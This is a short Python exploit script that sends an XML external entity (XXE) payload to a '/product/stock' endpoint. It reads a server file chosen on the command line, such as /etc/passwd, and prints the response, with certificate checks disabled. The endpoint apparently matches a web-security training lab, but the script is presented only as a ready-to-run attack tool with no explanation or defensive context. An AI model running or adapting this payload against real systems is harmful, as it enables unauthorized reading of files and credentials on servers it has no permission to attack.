#Author MuteAvery

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', required=True, help="The base URL (e.g., https://target.com)")
parser.add_argument('-f', '--file', required=True, help="The file to read (e.g., /etc/passwd)")
args = parser.parse_args()

def exploit(url, file):
    uri = "/product/stock"
    full_url = url + uri

    xml_data = f"""
    <!DOCTYPE test [<!ENTITY xxe SYSTEM 'file://{file}'>]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId>3</storeId>
    </stockCheck>
    """
    try:
        r = requests.post(full_url, data=xml_data, verify=False)
        if r.status_code == 400:
            print("[+] Payload sent successfully!\n")
            print(r.text)
        else:
            print(f"[-] Failed to send payload. Status code: {r.status_code}")
            print(r.text) 
    except requests.exceptions.RequestException as e:
        print(f"Error during request: {e}")

def main():
    url = args.url
    file = args.file
    exploit(url, file)

main()
